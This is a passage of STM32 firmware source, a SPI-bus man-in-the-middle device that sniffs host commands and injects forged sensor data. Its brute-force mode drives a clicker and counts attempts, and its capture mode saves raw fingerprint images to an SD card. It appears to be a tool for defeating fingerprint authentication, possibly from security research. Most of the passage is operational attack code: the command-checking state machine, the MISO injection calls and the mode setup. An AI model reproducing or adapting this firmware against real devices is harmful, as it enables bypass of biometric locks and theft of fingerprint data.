			    			if(sw_state==SW_RC){
			    				InjectMISO((unsigned char *)inject_buf,try1_rev_buf+7169*11, 7169, 5*2, 0x00,0);
			    			}else{
								if(TRY1_INJECT_ON)
									InjectMISO((unsigned char *)inject_buf,NULL, 7169, 5*2, 0x00,1);
								else
									InjectMISO((unsigned char *)inject_buf,NULL, 7169, 5*2, 0x00,0);
			    			}
			    			break;
			    		case TRY1_13:
			    			if( !((cmd==0x88F0) || (cmd==0xF088) || (cmd==0x8800) || (cmd==0x0088)) || (dur<2) || (dur>8) ){
			    				Exception_Handler(inject_cnt, try_state, MOSI_CMD_ERROR, 1);
			    			}
							if(sw_state==SW_TE)
							  try_state = TRY1_1;
							else
							  try_state = TRY2_1;

							if(sw_state==SW_RC){
								InjectMISO((unsigned char *)inject_buf,try1_rev_buf+7169*12, 897, 3*2, 0x00,0);
							}else{
								if(TRY1_INJECT_ON)
									InjectMISO((unsigned char *)inject_buf,NULL, 897, 3*2, 0x00,1);
								else
									InjectMISO((unsigned char *)inject_buf,NULL, 897, 3*2, 0x00,0);
							}
			    			OSSemBinGive(&SemBin2);
			    			OSDelayTask(80);
			    			if(sw_state==SW_TE){
			    				inject_cnt++;
			    				SD_SaveInjectCntFile(inject_cnt);
			    				LED_OFF(EYE_LED);
			    				Segment_ShowNum(inject_cnt-1);
			    			}
			    			break;

			    		case TRY2_1:
			    			if( !((cmd==0x88F0) || (cmd==0xF088) || (cmd==0x8800) || (cmd==0x0088)) || (dur<80) )
			    				Exception_Handler(inject_cnt, try_state, MOSI_CMD_ERROR, 1);
			    			try_state = TRY2_2;
			    			if(TRY2_INJECT_ON)
			    				InjectMISO((unsigned char *)inject_buf,NULL, 7169, 5*2, 0x00,1);
			    			else
			    				InjectMISO((unsigned char *)inject_buf,NULL, 7169, 5*2, 0x00,0);
			    			break;
			    		case TRY2_2:
			    			if( !((cmd==0xA4F0) || (cmd==0xF0A4) || (cmd==0xA400) || (cmd==0x00A4)) || (dur<2) || (dur>8) )
			    				Exception_Handler(inject_cnt, try_state, MOSI_CMD_ERROR, 1);
			    			try_state = TRY2_3;
			    			if(TRY2_INJECT_ON)
			    				InjectMISO((unsigned char *)inject_buf,NULL, 7169, 5*2, 0x00,1);
			    			else
			    				InjectMISO((unsigned char *)inject_buf,NULL, 7169, 5*2, 0x00,0);
			    			break;
			    		case TRY2_3:
			    			if( !((cmd==0xC0F0) || (cmd==0xF0C0) || (cmd==0xC000) || (cmd==0x00C0)) || (dur<2) || (dur>8) )
			    				Exception_Handler(inject_cnt, try_state, MOSI_CMD_ERROR, 1);
			    			try_state = TRY2_4;
			    			if(TRY2_INJECT_ON)
			    				InjectMISO((unsigned char *)inject_buf,NULL, 7169, 5*2, 0x00,1);
			    			else
			    				InjectMISO((unsigned char *)inject_buf,NULL, 7169, 5*2, 0x00,0);
			    			break;
			    		case TRY2_4:
			    			if( !((cmd==0xDCF0) || (cmd==0xF0DC) || (cmd==0xDC00) || (cmd==0x00DC)) || (dur<2) || (dur>8) )
			    				Exception_Handler(inject_cnt, try_state, MOSI_CMD_ERROR, 1);
			    			try_state = TRY2_5;
			    			if(TRY2_INJECT_ON)
			    				InjectMISO((unsigned char *)inject_buf,NULL, 7169, 5*2, 0x00,1);
			    			else
			    				InjectMISO((unsigned char *)inject_buf,NULL, 7169, 5*2, 0x00,0);
			    			break;
			    		case TRY2_5:
			    			if( !((cmd==0x88F0) || (cmd==0xF088) || (cmd==0x8800) || (cmd==0x0088)) || (dur<2) || (dur>8) )
			    				Exception_Handler(inject_cnt, try_state, MOSI_CMD_ERROR, 1);
			    			try_state = TRY2_6;
			    			if(TRY2_INJECT_ON)
			    				InjectMISO((unsigned char *)inject_buf,NULL, 7169, 5*2, 0x00,1);
			    			else
			    				InjectMISO((unsigned char *)inject_buf,NULL, 7169, 5*2, 0x00,0);
			    			break;
			    		case TRY2_6:
			    			if( !((cmd==0xA4F0) || (cmd==0xF0A4) || (cmd==0xA400) || (cmd==0x00A4)) || (dur<2) || (dur>8) )
			    				Exception_Handler(inject_cnt, try_state, MOSI_CMD_ERROR, 1);
			    			try_state = TRY2_7;
			    			if(TRY2_INJECT_ON)
			    				InjectMISO((unsigned char *)inject_buf,NULL, 7169, 5*2, 0x00,1);
			    			else
			    				InjectMISO((unsigned char *)inject_buf,NULL, 7169, 5*2, 0x00,0);
			    			break;
			    		case TRY2_7:
			    			if( !((cmd==0xC0F0) || (cmd==0xF0C0) || (cmd==0xC000) || (cmd==0x00C0)) || (dur<2) || (dur>8) )
			    				Exception_Handler(inject_cnt, try_state, MOSI_CMD_ERROR, 1);
			    			try_state = TRY2_8;
			    			if(TRY2_INJECT_ON)
			    				InjectMISO((unsigned char *)inject_buf,NULL, 7169, 5*2, 0x00,1);
			    			else
			    				InjectMISO((unsigned char *)inject_buf,NULL, 7169, 5*2, 0x00,0);
			    			break;
			    		case TRY2_8:
			    			if( !((cmd==0xDCF0) || (cmd==0xF0DC) || (cmd==0xDC00) || (cmd==0x00DC)) || (dur<2) || (dur>8) )
			    				Exception_Handler(inject_cnt, try_state, MOSI_CMD_ERROR, 1);
			    			try_state = TRY2_9;
			    			if(TRY2_INJECT_ON)
			    				InjectMISO((unsigned char *)inject_buf,NULL, 7169, 5*2, 0x00,1);
			    			else
			    				InjectMISO((unsigned char *)inject_buf,NULL, 7169, 5*2, 0x00,0);
			    			break;
			    		case TRY2_9:
			    			if( !((cmd==0x88F0) || (cmd==0xF088) || (cmd==0x8800) || (cmd==0x0088)) || (dur<2) || (dur>8) )
			    				Exception_Handler(inject_cnt, try_state, MOSI_CMD_ERROR, 1);
			    			try_state = TRY2_10;
			    			if(TRY2_INJECT_ON)
			    				InjectMISO((unsigned char *)inject_buf,NULL, 7169, 5*2, 0x00,1);
			    			else
			    				InjectMISO((unsigned char *)inject_buf,NULL, 7169, 5*2, 0x00,0);
			    			break;
			    		case TRY2_10:
			    			if( !((cmd==0xA4F0) || (cmd==0xF0A4) || (cmd==0xA400) || (cmd==0x00A4)) || (dur<2) || (dur>8) )
			    				Exception_Handler(inject_cnt, try_state, MOSI_CMD_ERROR, 1);
			    			try_state = TRY2_11;
			    			if(TRY2_INJECT_ON)
			    				InjectMISO((unsigned char *)inject_buf,NULL, 7169, 5*2, 0x00,1);
			    			else
			    				InjectMISO((unsigned char *)inject_buf,NULL, 7169, 5*2, 0x00,0);
			    			break;
			    		case TRY2_11:
			    			if( !((cmd==0xC0F0) || (cmd==0xF0C0) || (cmd==0xC000) || (cmd==0x00C0)) || (dur<2) || (dur>8) )
			    				Exception_Handler(inject_cnt, try_state, MOSI_CMD_ERROR, 1);
			    			try_state = TRY2_12;
			    			if(TRY2_INJECT_ON)
			    				InjectMISO((unsigned char *)inject_buf,NULL, 7169, 5*2, 0x00,1);
			    			else
			    				InjectMISO((unsigned char *)inject_buf,NULL, 7169, 5*2, 0x00,0);
			    			break;
			    		case TRY2_12:
			    			if( !((cmd==0xDCF0) || (cmd==0xF0DC) || (cmd==0xDC00) || (cmd==0x00DC)) || (dur<2) || (dur>8) )
			    				Exception_Handler(inject_cnt, try_state, MOSI_CMD_ERROR, 1);
			    			try_state = TRY2_13;
			    			if(TRY2_INJECT_ON)
			    				InjectMISO((unsigned char *)inject_buf,NULL, 7169, 5*2, 0x00,1);
			    			else
			    				InjectMISO((unsigned char *)inject_buf,NULL, 7169, 5*2, 0x00,0);
			    			break;
			    		case TRY2_13:
			    			if( !((cmd==0x88F0) || (cmd==0xF088) || (cmd==0x8800) || (cmd==0x0088)) || (dur<2) || (dur>8) )
			    				Exception_Handler(inject_cnt, try_state, MOSI_CMD_ERROR, 1);
			    			try_state = TRY3_1;
			    			if(TRY2_INJECT_ON)
			    				InjectMISO((unsigned char *)inject_buf,NULL, 897, 3*2, 0x00,1);
			    			else
			    				InjectMISO((unsigned char *)inject_buf,NULL, 897, 3*2, 0x00,0);
			    			if(sw_state!=SW_PA)
			    				OSSemBinGive(&SemBin2);
			    			OSDelayTask(80);
			    			break;


			    		case TRY3_1:
			    			if( !((cmd==0x88F0) || (cmd==0xF088) || (cmd==0x8800) || (cmd==0x0088)) || (dur<80))
			    				Exception_Handler(inject_cnt, try_state, MOSI_CMD_ERROR, 1);
			    			try_state = TRY3_2;
			    			SPDT_FakeMISO_On();
			    			if(sw_state!=SW_PA)
			    				OSSemBinGive(&SemBin2);
			    			OSDelayTask(2);
			    			SPDT_FakeMISO_Off();
			    			break;
			    		case TRY3_2:
			    			if( !((cmd==0xA4F0) || (cmd==0xF0A4) || (cmd==0xA400) || (cmd==0x00A4)) || (dur<2) || (dur>8) )
			    				Exception_Handler(inject_cnt, try_state, MOSI_CMD_ERROR, 1);
			    			try_state = TRY3_3;
			    			if(sw_state!=SW_PA)
			    				OSSemBinGive(&SemBin2);
			    			OSDelayTask(2);
			    			break;
			    		case TRY3_3:
			    			if( !((cmd==0xC0F0) || (cmd==0xF0C0) || (cmd==0xC000) || (cmd==0x00C0)) || (dur<2) || (dur>8) )
			    				Exception_Handler(inject_cnt, try_state, MOSI_CMD_ERROR, 1);
			    			try_state = TRY3_4;
			    			if(sw_state!=SW_PA)
			    				OSSemBinGive(&SemBin2);
			    			OSDelayTask(2);
			    			break;
			    		case TRY3_4:
			    			if( !((cmd==0xDCF0) || (cmd==0xF0DC) || (cmd==0xDC00) || (cmd==0x00DC)) || (dur<2) || (dur>8) )
			    				Exception_Handler(inject_cnt, try_state, MOSI_CMD_ERROR, 1);
			    			try_state = TRY3_5;
			    			if(sw_state!=SW_PA)
			    				OSSemBinGive(&SemBin2);
			    			OSDelayTask(2);
			    			break;
			    		case TRY3_5:
			    			if( !((cmd==0x88F0) || (cmd==0xF088) || (cmd==0x8800) || (cmd==0x0088)) || (dur<2) || (dur>8) )
			    				Exception_Handler(inject_cnt, try_state, MOSI_CMD_ERROR, 1);
			    			try_state = TRY3_6;
			    			if(sw_state!=SW_PA)
			    				OSSemBinGive(&SemBin2);
			    			OSDelayTask(2);
			    			break;
			    		case TRY3_6:
			    			if( !((cmd==0xA4F0) || (cmd==0xF0A4) || (cmd==0xA400) || (cmd==0x00A4)) || (dur<2) || (dur>8) )
			    				Exception_Handler(inject_cnt, try_state, MOSI_CMD_ERROR, 1);
			    			try_state = TRY3_7;
			    			if(sw_state!=SW_PA)
			    				OSSemBinGive(&SemBin2);
			    			OSDelayTask(2);
			    			break;
			    		case TRY3_7:
			    			if( !((cmd==0xC0F0) || (cmd==0xF0C0) || (cmd==0xC000) || (cmd==0x00C0)) || (dur<2) || (dur>8) )
			    				Exception_Handler(inject_cnt, try_state, MOSI_CMD_ERROR, 1);
			    			try_state = TRY3_8;
			    			if(sw_state!=SW_PA)
			    				OSSemBinGive(&SemBin2);
			    			OSDelayTask(2);
			    			break;
			    		case TRY3_8:
			    			if( !((cmd==0xDCF0) || (cmd==0xF0DC) || (cmd==0xDC00) || (cmd==0x00DC)) || (dur<2) || (dur>8) )
			    				Exception_Handler(inject_cnt, try_state, MOSI_CMD_ERROR, 1);
			    			try_state = TRY3_9;
			    			OSSemBinGive(&SemBin2);
			    			OSDelayTask(2);
			    			break;
			    		case TRY3_9:
			    			if( !((cmd==0x88F0) || (cmd==0xF088) || (cmd==0x8800) || (cmd==0x0088)) || (dur<2) || (dur>8) )
			    				Exception_Handler(inject_cnt, try_state, MOSI_CMD_ERROR, 1);
			    			try_state = TRY3_10;
			    			if(sw_state!=SW_PA)
			    				OSSemBinGive(&SemBin2);
			    			OSDelayTask(2);
			    			break;
			    		case TRY3_10:
			    			if( !((cmd==0xA4F0) || (cmd==0xF0A4) || (cmd==0xA400) || (cmd==0x00A4)) || (dur<2) || (dur>8) )
			    				Exception_Handler(inject_cnt, try_state, MOSI_CMD_ERROR, 1);
			    			try_state = TRY3_11;
			    			if(sw_state!=SW_PA)
			    				OSSemBinGive(&SemBin2);
			    			OSDelayTask(2);
			    			break;
			    		case TRY3_11:
			    			if( !((cmd==0xC0F0) || (cmd==0xF0C0) || (cmd==0xC000) || (cmd==0x00C0)) || (dur<2) || (dur>8) )
			    				Exception_Handler(inject_cnt, try_state, MOSI_CMD_ERROR, 1);
			    			try_state = TRY3_12;
			    			SPDT_FakeMISO_On();
			    			if(sw_state!=SW_PA)
			    				OSSemBinGive(&SemBin2);
			    			OSDelayTask(2);
			    			SPDT_FakeMISO_Off();
			    			break;
			    		case TRY3_12:
			    			if( !((cmd==0xDCF0) || (cmd==0xF0DC) || (cmd==0xDC00) || (cmd==0x00DC)) || (dur<2) || (dur>8) )
			    				Exception_Handler(inject_cnt, try_state, MOSI_CMD_ERROR, 1);
			    			try_state = TRY3_13;
			    			SPDT_FakeMISO_On();
			    			if(sw_state!=SW_PA)
			    				OSSemBinGive(&SemBin2);
			    			OSDelayTask(2);
			    			SPDT_FakeMISO_Off();
			    			break;
			    		case TRY3_13:
			    			if( !((cmd==0x88F0) || (cmd==0xF088) || (cmd==0x8800) || (cmd==0x0088)) || (dur<2) || (dur>8) )
			    				Exception_Handler(inject_cnt, try_state, MOSI_CMD_ERROR, 1);
			    			try_state = TRY0_1;

			    			if(sw_state==SW_RC){
			    				SD_SaveFingerprintBMP(inject_cnt, "RawCapture/",try0_rev_buf,try1_rev_buf);
			    				//SD_SaveFingerprintRAW(inject_cnt, "RawCapture/",try0_rev_buf,try1_rev_buf);
			    			}

			    			inject_cnt++;
			    			LED_OFF(EYE_LED);
			    			if(sw_state==SW_PA)
			    				Segment_ShowNum(inject_cnt-1);
			    			SD_SaveInjectCntFile(inject_cnt);
			    			if(sw_state!=SW_PA){
			    				OSSemBinGive(&SemBin2);
			    				OSSuspendTask(SNIFFER);
			    			}
			    			break;

			    		default:
			    			break;
			    	}
			    	break;
			    }
			    default:
			       break;
			}
    }
}

void Process(void *para){
	uint16_t sw_states;

	Beep_On();
	Delay(500); // Pressing duration
	Beep_Off();
	Delay(1000); // Lift duration

	SPDT_FakeMISO_Off();

	while(1){
		sw_states = SW_GetStates();
		if((!(sw_states & SW_SNAP)) || (sw_state==SW_UNKNOWN)){
			__disable_irq();
			NVIC_SystemReset();
		}

		if(sw_state==SW_BF)
			Clicker_Press();
		OSDelayTask(900);
		if(sw_state==SW_BF)
			Clicker_Release();
		OSDelayTask(400);
/*
		if(sw_state!=SW_TE){
			if(try_state==TRY1_1){
				watchdog1++;
				watchdog2=0;
				watchdog3=0;
			}else if(try_state==TRY2_1){
				watchdog1=0;;
				watchdog2++;
				watchdog3=0;
			}else if(try_state==TRY3_1){
				watchdog1=0;
				watchdog2=0;
				watchdog3++;
			}
			else{
				watchdog1=0;
				watchdog2=0;
				watchdog3=0;
			}
			if( (watchdog1>8)|| (watchdog2>8) || (watchdog3>8) ){
				Exception_Handler(inject_cnt, try_state, SUCESS_OR_TOOFAST_OR_UNLIVE, 1);
			}
		}
*/
		if(sw_state==SW_BF)
			Segment_ShowBFState((TRY0_INJECT_ON+TRY1_INJECT_ON+TRY2_INJECT_ON)*(inject_cnt-1));
		if(sw_state==SW_RC)
			Segment_ShowRCState(inject_cnt-1);
	}
}

/* USER CODE END 0 */

/**
  * @brief  The application entry point.
  * @retval int
  */
int main(void)
{
  /* USER CODE BEGIN 1 */

  /* USER CODE END 1 */

  /* MCU Configuration--------------------------------------------------------*/

  /* Reset of all peripherals, Initializes the Flash interface and the Systick. */
  HAL_Init();

  /* USER CODE BEGIN Init */

  /* USER CODE END Init */

  /* Configure the system clock */
  SystemClock_Config();

  /* USER CODE BEGIN SysInit */

  /* USER CODE END SysInit */

  /* Initialize all configured peripherals */
  MX_GPIO_Init();
  MX_DMA_Init();
  MX_SDIO_SD_Init();
  MX_SPI1_Init();
  MX_FATFS_Init();
  MX_USB_DEVICE_Init();
  MX_I2C2_Init();
  MX_USART1_UART_Init();
  /* USER CODE BEGIN 2 */
  Segment_Init();

  SPDT_FakeMISO_On();
  Segment_ShowNull();
  LED_OFF(ALL_LED);

  uint16_t sw_states;
  uint8_t need_clrcnt=0;
  do{
	  sw_states = SW_GetStates();
	  switch(sw_states & 0xF){
	   	  case SW_PA:
	   		  SPDT_FakeMISO_On();
	   		  Segment_ShowPA();
	   		  sw_state = SW_PA;
	   		  break;

	   	  case SW_BF:
	   		  SPDT_FakeMISO_On();
	   		  Segment_ShowBF();
	   		  sw_state = SW_BF;
	   		  break;

	   	  case SW_RC:
	   		  SPDT_FakeMISO_On();
	   		  Segment_ShowRC();
	   		  sw_state = SW_RC;
	   		  break;

	   	  case SW_TE:
	   		  SPDT_FakeMISO_On();
	   		  Segment_ShowTE();
	   		  sw_state = SW_TE;
	   		  break;

	   	  default:
	   		 SPDT_FakeMISO_Off();
	   		 Segment_ShowDash();
	   		 sw_state = SW_UNKNOWN;
	   		 need_clrcnt=1;
	   		 break;
	   }
  }while( (!(sw_states & SW_SNAP)) || (sw_state==SW_UNKNOWN));

  if(sw_state==SW_TE){
	  try_state = TRY1_1;
  }
  else{
	  try_state = TRY0_1;
  }

  LED_ON(STATE_LED);
  SD_Init();

  if(need_clrcnt){
	  need_clrcnt=0;
	  SD_DelInjectCntFile();
  }

  SD_CheckInjectCntFile(&inject_cnt);

  HAL_NVIC_DisableIRQ(DMA2_Stream0_IRQn);
  HAL_SPI_RegisterCallback(&hspi1, HAL_SPI_TX_COMPLETE_CB_ID, SPI1_Cplt_Callback);
  HAL_SPI_RegisterCallback(&hspi1, HAL_SPI_TX_RX_COMPLETE_CB_ID, SPI1_Cplt_Callback);
  HAL_SPI_RegisterCallback(&hspi1, HAL_SPI_ERROR_CB_ID, SPI1_TX_Error_Callback);

  OSInit();
  OSCreatTask(IdleTask,(void *)0,idle_stack,IDLE_STK_SZ,"IdleTask",IDLE);
  OSCreatTask(PrepareTask,(void *)0,prepare_stack,PREPARE_STK_SZ,"PrepareTask",PREPARE);
  OSCreatTask(Sniffer,(void *)0,sniffer_stack,SNIFFER_STK_SZ,"Sniffer",SNIFFER);
  OSCreatTask(Process,(void *)0,process_stack,PROCESS_STK_SZ,"Process",PROCESS);
  OSSemBinCreat(&SemBin,0);
  OSSemBinCreat(&SemBin2,0);
  OSStart();
  /* USER CODE END 2 */

  /* Infinite loop */
  /* USER CODE BEGIN WHILE */
  while (1)
  {
    /* USER CODE END WHILE */

    /* USER CODE BEGIN 3 */
  }
  /* USER CODE END 3 */
}

/**
  * @brief System Clock Configuration
  * @retval None
  */
void SystemClock_Config(void)
{
  RCC_OscInitTypeDef RCC_OscInitStruct = {0};
  RCC_ClkInitTypeDef RCC_ClkInitStruct = {0};

  /** Configure the main internal regulator output voltage
  */
  __HAL_RCC_PWR_CLK_ENABLE();
  __HAL_PWR_VOLTAGESCALING_CONFIG(PWR_REGULATOR_VOLTAGE_SCALE1);
  /** Initializes the RCC Oscillators according to the specified parameters
  * in the RCC_OscInitTypeDef structure.
  */
  RCC_OscInitStruct.OscillatorType = RCC_OSCILLATORTYPE_HSE;
  RCC_OscInitStruct.HSEState = RCC_HSE_ON;
  RCC_OscInitStruct.PLL.PLLState = RCC_PLL_ON;
  RCC_OscInitStruct.PLL.PLLSource = RCC_PLLSOURCE_HSE;
  RCC_OscInitStruct.PLL.PLLM = 8;
  RCC_OscInitStruct.PLL.PLLN = 192;
  RCC_OscInitStruct.PLL.PLLP = RCC_PLLP_DIV2;
  RCC_OscInitStruct.PLL.PLLQ = 4;
  RCC_OscInitStruct.PLL.PLLR = 2;
  if (HAL_RCC_OscConfig(&RCC_OscInitStruct) != HAL_OK)
  {
    Error_Handler();
  }
  /** Initializes the CPU, AHB and APB buses clocks
  */
  RCC_ClkInitStruct.ClockType = RCC_CLOCKTYPE_HCLK|RCC_CLOCKTYPE_SYSCLK
                              |RCC_CLOCKTYPE_PCLK1|RCC_CLOCKTYPE_PCLK2;
  RCC_ClkInitStruct.SYSCLKSource = RCC_SYSCLKSOURCE_PLLCLK;
  RCC_ClkInitStruct.AHBCLKDivider = RCC_SYSCLK_DIV1;
  RCC_ClkInitStruct.APB1CLKDivider = RCC_HCLK_DIV2;
  RCC_ClkInitStruct.APB2CLKDivider = RCC_HCLK_DIV1;

  if (HAL_RCC_ClockConfig(&RCC_ClkInitStruct, FLASH_LATENCY_3) != HAL_OK)
  {
    Error_Handler();
  }
}

/**
  * @brief I2C2 Initialization Function
  * @param None
  * @retval None
  */
static void MX_I2C2_Init(void)
{

  /* USER CODE BEGIN I2C2_Init 0 */

  /* USER CODE END I2C2_Init 0 */

  /* USER CODE BEGIN I2C2_Init 1 */

  /* USER CODE END I2C2_Init 1 */
  hi2c2.Instance = I2C2;
  hi2c2.Init.ClockSpeed = 100000;
  hi2c2.Init.DutyCycle = I2C_DUTYCYCLE_2;
  hi2c2.Init.OwnAddress1 = 0;
  hi2c2.Init.AddressingMode = I2C_ADDRESSINGMODE_7BIT;
  hi2c2.Init.DualAddressMode = I2C_DUALADDRESS_DISABLE;
  hi2c2.Init.OwnAddress2 = 0;
  hi2c2.Init.GeneralCallMode = I2C_GENERALCALL_DISABLE;
  hi2c2.Init.NoStretchMode = I2C_NOSTRETCH_DISABLE;
  if (HAL_I2C_Init(&hi2c2) != HAL_OK)
  {
    Error_Handler();
  }
  /* USER CODE BEGIN I2C2_Init 2 */

  /* USER CODE END I2C2_Init 2 */

}

/**
  * @brief SDIO Initialization Function
  * @param None
  * @retval None
  */
static void MX_SDIO_SD_Init(void)
{

  /* USER CODE BEGIN SDIO_Init 0 */

  /* USER CODE END SDIO_Init 0 */

  /* USER CODE BEGIN SDIO_Init 1 */

  /* USER CODE END SDIO_Init 1 */
  hsd.Instance = SDIO;
  hsd.Init.ClockEdge = SDIO_CLOCK_EDGE_RISING;
  hsd.Init.ClockBypass = SDIO_CLOCK_BYPASS_DISABLE;
  hsd.Init.ClockPowerSave = SDIO_CLOCK_POWER_SAVE_DISABLE;
  hsd.Init.BusWide = SDIO_BUS_WIDE_1B;
  hsd.Init.HardwareFlowControl = SDIO_HARDWARE_FLOW_CONTROL_ENABLE;
  hsd.Init.ClockDiv = 0;
  /* USER CODE BEGIN SDIO_Init 2 */

  /* USER CODE END SDIO_Init 2 */

}

/**
  * @brief SPI1 Initialization Function
  * @param None
  * @retval None
  */
static void MX_SPI1_Init(void)
{

  /* USER CODE BEGIN SPI1_Init 0 */

  /* USER CODE END SPI1_Init 0 */

  /* USER CODE BEGIN SPI1_Init 1 */

  /* USER CODE END SPI1_Init 1 */
  /* SPI1 parameter configuration*/
  hspi1.Instance = SPI1;
  hspi1.Init.Mode = SPI_MODE_SLAVE;
  hspi1.Init.Direction = SPI_DIRECTION_2LINES;
  hspi1.Init.DataSize = SPI_DATASIZE_8BIT;
  hspi1.Init.CLKPolarity = SPI_POLARITY_LOW;
  hspi1.Init.CLKPhase = SPI_PHASE_1EDGE;
  hspi1.Init.NSS = SPI_NSS_HARD_INPUT;
  hspi1.Init.FirstBit = SPI_FIRSTBIT_MSB;
  hspi1.Init.TIMode = SPI_TIMODE_DISABLE;
  hspi1.Init.CRCCalculation = SPI_CRCCALCULATION_DISABLE;
  hspi1.Init.CRCPolynomial = 10;
  if (HAL_SPI_Init(&hspi1) != HAL_OK)
  {
    Error_Handler();
  }
  /* USER CODE BEGIN SPI1_Init 2 */

  /* USER CODE END SPI1_Init 2 */

}

/**
  * @brief USART1 Initialization Function
  * @param None
  * @retval None
  */
static void MX_USART1_UART_Init(void)
{

  /* USER CODE BEGIN USART1_Init 0 */

  /* USER CODE END USART1_Init 0 */

  /* USER CODE BEGIN USART1_Init 1 */

  /* USER CODE END USART1_Init 1 */
  huart1.Instance = USART1;
  huart1.Init.BaudRate = 115200;
  huart1.Init.WordLength = UART_WORDLENGTH_8B;
  huart1.Init.StopBits = UART_STOPBITS_1;
  huart1.Init.Parity = UART_PARITY_NONE;
  huart1.Init.Mode = UART_MODE_TX_RX;
  huart1.Init.HwFlowCtl = UART_HWCONTROL_NONE;
  huart1.Init.OverSampling = UART_OVERSAMPLING_16;
  if (HAL_UART_Init(&huart1) != HAL_OK)
  {
    Error_Handler();
  }
  /* USER CODE BEGIN USART1_Init 2 */

  /* USER CODE END USART1_Init 2 */

}

/**
  * Enable DMA controller clock
  */
static void MX_DMA_Init(void)
{

  /* DMA controller clock enable */
  __HAL_RCC_DMA2_CLK_ENABLE();

  /* DMA interrupt init */
  /* DMA2_Stream0_IRQn interrupt configuration */
  HAL_NVIC_SetPriority(DMA2_Stream0_IRQn, 0, 0);
  HAL_NVIC_EnableIRQ(DMA2_Stream0_IRQn);
  /* DMA2_Stream2_IRQn interrupt configuration */
  HAL_NVIC_SetPriority(DMA2_Stream2_IRQn, 0, 0);
  HAL_NVIC_EnableIRQ(DMA2_Stream2_IRQn);
  /* DMA2_Stream3_IRQn interrupt configuration */
  HAL_NVIC_SetPriority(DMA2_Stream3_IRQn, 1, 0);
  HAL_NVIC_EnableIRQ(DMA2_Stream3_IRQn);
  /* DMA2_Stream6_IRQn interrupt configuration */
  HAL_NVIC_SetPriority(DMA2_Stream6_IRQn, 1, 0);
  HAL_NVIC_EnableIRQ(DMA2_Stream6_IRQn);

}

/**
  * @brief GPIO Initialization Function
  * @param None
  * @retval None
  */
static void MX_GPIO_Init(void)
{
  GPIO_InitTypeDef GPIO_InitStruct = {0};

  /* GPIO Ports Clock Enable */
  __HAL_RCC_GPIOC_CLK_ENABLE();
  __HAL_RCC_GPIOH_CLK_ENABLE();
  __HAL_RCC_GPIOA_CLK_ENABLE();
  __HAL_RCC_GPIOB_CLK_ENABLE();

  /*Configure GPIO pin Output Level */
  HAL_GPIO_WritePin(GPIOC, GPIO_PIN_13, GPIO_PIN_SET);

  /*Configure GPIO pin Output Level */
  HAL_GPIO_WritePin(GPIOC, GPIO_PIN_14, GPIO_PIN_RESET);

  /*Configure GPIO pin Output Level */
  HAL_GPIO_WritePin(GPIOA, GPIO_PIN_1, GPIO_PIN_RESET);

  /*Configure GPIO pin Output Level */
  HAL_GPIO_WritePin(GPIOB, GPIO_PIN_13|GPIO_PIN_8|GPIO_PIN_9, GPIO_PIN_RESET);

  /*Configure GPIO pins : PC13 PC14 */
  GPIO_InitStruct.Pin = GPIO_PIN_13|GPIO_PIN_14;
  GPIO_InitStruct.Mode = GPIO_MODE_OUTPUT_PP;
  GPIO_InitStruct.Pull = GPIO_NOPULL;
  GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_LOW;
  HAL_GPIO_Init(GPIOC, &GPIO_InitStruct);

  /*Configure GPIO pin : PC15 */
  GPIO_InitStruct.Pin = GPIO_PIN_15;
  GPIO_InitStruct.Mode = GPIO_MODE_INPUT;
  GPIO_InitStruct.Pull = GPIO_NOPULL;
  HAL_GPIO_Init(GPIOC, &GPIO_InitStruct);

  /*Configure GPIO pins : PA0 PA2 PA3 */
  GPIO_InitStruct.Pin = GPIO_PIN_0|GPIO_PIN_2|GPIO_PIN_3;
  GPIO_InitStruct.Mode = GPIO_MODE_INPUT;
  GPIO_InitStruct.Pull = GPIO_NOPULL;
  HAL_GPIO_Init(GPIOA, &GPIO_InitStruct);

  /*Configure GPIO pin : PA1 */
  GPIO_InitStruct.Pin = GPIO_PIN_1;
  GPIO_InitStruct.Mode = GPIO_MODE_OUTPUT_PP;
  GPIO_InitStruct.Pull = GPIO_NOPULL;
  GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_LOW;
  HAL_GPIO_Init(GPIOA, &GPIO_InitStruct);

  /*Configure GPIO pins : PB13 PB8 PB9 */
  GPIO_InitStruct.Pin = GPIO_PIN_13|GPIO_PIN_8|GPIO_PIN_9;
  GPIO_InitStruct.Mode = GPIO_MODE_OUTPUT_PP;
  GPIO_InitStruct.Pull = GPIO_NOPULL;
  GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_LOW;
  HAL_GPIO_Init(GPIOB, &GPIO_InitStruct);

  /*Configure GPIO pin : PB7 */
  GPIO_InitStruct.Pin = GPIO_PIN_7;
  GPIO_InitStruct.Mode = GPIO_MODE_INPUT;
  GPIO_InitStruct.Pull = GPIO_NOPULL;
  HAL_GPIO_Init(GPIOB, &GPIO_InitStruct);

}

/* USER CODE BEGIN 4 */
void HAL_SPI_MspInit_Capture(SPI_HandleTypeDef* hspi)
{
	  GPIO_InitTypeDef GPIO_InitStruct = {0};
	  if(hspi->Instance==SPI1)
	  {
	  /* USER CODE BEGIN SPI1_MspInit 0 */

	  /* USER CODE END SPI1_MspInit 0 */
	    /* Peripheral clock enable */
	    __HAL_RCC_SPI1_CLK_ENABLE();

	    __HAL_RCC_GPIOA_CLK_ENABLE();
	    __HAL_RCC_GPIOB_CLK_ENABLE();
	    /**SPI1 GPIO Configuration
	    PA4     ------> SPI1_NSS
	    PA5     ------> SPI1_SCK
	    PA7     ------> SPI1_MOSI
	    PB4     ------> SPI1_MISO
	    */
	    GPIO_InitStruct.Pin = GPIO_PIN_4|GPIO_PIN_5|GPIO_PIN_7;
	    GPIO_InitStruct.Mode = GPIO_MODE_AF_PP;
	    GPIO_InitStruct.Pull = GPIO_NOPULL;
	    GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_VERY_HIGH;
	    GPIO_InitStruct.Alternate = GPIO_AF5_SPI1;
	    HAL_GPIO_Init(GPIOA, &GPIO_InitStruct);

	    GPIO_InitStruct.Pin = GPIO_PIN_4;
	    GPIO_InitStruct.Mode = GPIO_MODE_AF_PP;
	    GPIO_InitStruct.Pull = GPIO_NOPULL;
	    GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_VERY_HIGH;
	    GPIO_InitStruct.Alternate = GPIO_AF5_SPI1;
	    HAL_GPIO_Init(GPIOB, &GPIO_InitStruct);

	    /* SPI1 DMA Init */
	    /* SPI1_RX Init */
	    hdma_spi1_rx.Instance = DMA2_Stream0;
	    hdma_spi1_rx.Init.Channel = DMA_CHANNEL_3;
